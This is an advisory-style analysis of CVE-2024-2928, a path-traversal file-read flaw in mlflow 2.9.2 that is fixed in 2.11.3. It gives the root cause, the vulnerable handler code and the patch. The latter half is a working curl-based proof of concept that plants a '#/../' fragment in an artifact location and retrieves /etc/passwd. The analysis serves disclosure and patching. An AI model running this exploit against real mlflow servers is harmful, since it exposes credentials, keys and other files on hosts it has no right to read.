1. Detailed Summary  
   • CVE Identifier: CVE-2024-2928  
   • Vulnerability Type: Local File Inclusion due to Path Traversal (CWE-29)  
   • Affected Software & Version: mlflow version 2.9.2  
   • Fixed In: mlflow version 2.11.3  
   • Description:  
     The mlflow tracking server fails to validate directory-traversal sequences (“../”) in the fragment portion of a provided URI. Although a prior patch covered traversal in the query string, it did not inspect URL fragments. An attacker can therefore embed “../” in a URI fragment (everything after the ‘#’) when creating an experiment or a model version, causing mlflow to resolve and serve arbitrary files from the host file system (for example, reading `/etc/passwd`). This effectively grants read access to any file on the mlflow server container or host.

2. Root Cause Analysis  
   The vulnerability stems from two related code-validation gaps in `mlflow/server/handlers.py`:  
   • In `_create_experiment()`, only the query component of the artifact location is validated for directory-traversal; the fragment component is ignored.  
   • In `_validate_source()`, mlflow assumes that every `source` URI is local when checking containment under the run’s artifact directory, without first verifying whether the artifact URI is in fact a `file://` URI. This allowed escapes via malicious URIs that end up being treated as local paths.

   Key defective snippet before patch:  
   ```
   def _create_experiment():
       # ...
       parsed_artifact_location = urllib.parse.urlparse(request_message.artifact_location)
       validate_query_string(parsed_artifact_location.query)
       experiment_id = _get_tracking_store().create_experiment(
           request_message.name, request_message.artifact_location, tags
       )
   ```

   In `_validate_source()`:  
   ```
   def _validate_source(source: str, run_id: str) -> None:
       # ...
       source = pathlib.Path(local_file_uri_to_path(source)).resolve()
       run_artifact_dir = pathlib.Path(
           local_file_uri_to_path(run.info.artifact_uri)
       ).resolve()
       if run_artifact_dir in [source, *source.parents]:
           return
       raise MlflowException(...)
   ```
   Here, `run.info.artifact_uri` could be a malicious HTTP URL containing `#../../../../etc/`, but the code blindly converts it into a local path and resolves traversal.

   Patch summary (commit 96f0b5a):  
   • Reject any `artifact_location` URL that contains a fragment:  
     ```
     parsed = urllib.parse.urlparse(request_message.artifact_location)
     if parsed.fragment:
         raise MlflowException(
             "'artifact_location' URL can't include fragment part.",
             error_code=INVALID_PARAMETER_VALUE,
         )
     validate_query_string(parsed.query)
     ```  
   • Ensure `_validate_source()` only applies local-path containment logic when the run’s artifact URI is actually a file URI:  
     ```
     if is_local_uri(run.info.artifact_uri):            # new check
         run_artifact_dir = pathlib.Path(
             local_file_uri_to_path(run.info.artifact_uri)
         ).resolve()
         if run_artifact_dir in [source, *source.parents]:
             return
     ```

3. Exploit Details & PoC Steps  
   The advisory provides a complete proof-of-concept using mlflow’s REST API. The high-level flow is:  
   1. Start the mlflow server on localhost:5000  
      ```
      mlflow ui --host 127.0.0.1:5000
      ```  
   2. Create a malicious experiment whose `artifact_location` embeds a directory-traversal sequence in the URI fragment. Note the use of “#” instead of “?”:  
      ```
      curl -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create \
           -H 'Content-Type: application/json' \
           -d '{"name": "poc", 
                "artifact_location": "http:///#/../../../../../../../../../../../../../../etc/"}'
      ```  
      Response returns an `experiment_id`.  
   3. Create a run associated with that experiment:  
      ```
      curl -X POST http://127.0.0.1:5000/api/2.0/mlflow/runs/create \
           -H 'Content-Type: application/json' \
           -d '{"experiment_id": "<EXPERIMENT_ID>"}'
      ```  
      Response returns a `run_id`.  
   4. Register a new model in the registry:  
      ```
      curl -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create \
           -H 'Content-Type: application/json' \
           -d '{"name": "poc"}'
      ```  
   5. Create a model version pointing to the malicious run’s artifact folder. Because the stored `artifact_location` was never normalized, the handler resolves it to a local path outside the intended directory.  
      ```
      curl -X POST http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create \
           -H 'Content-Type: application/json' \
           -d '{"name": "poc",
                "run_id": "<RUN_ID>",
                "source": "file:///etc/"}'
      ```  
      Response returns model `version=1`.  
   6. Fetch an arbitrary file (e.g. /etc/passwd) via the artifact-retrieval endpoint:  
      ```
      curl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1'
      ```  
      The server responds with the contents of `/etc/passwd`.

   Impact:  
   Successful exploitation allows any unauthenticated network attacker to read arbitrary files on the mlflow server host, including sensitive configuration files, SSH keys, database credentials, etc.

   Mitigation:  
   Upgrade to mlflow ≥ 2.11.3, which includes the fragment-reject and local-URI guard in the `_validate_source` function.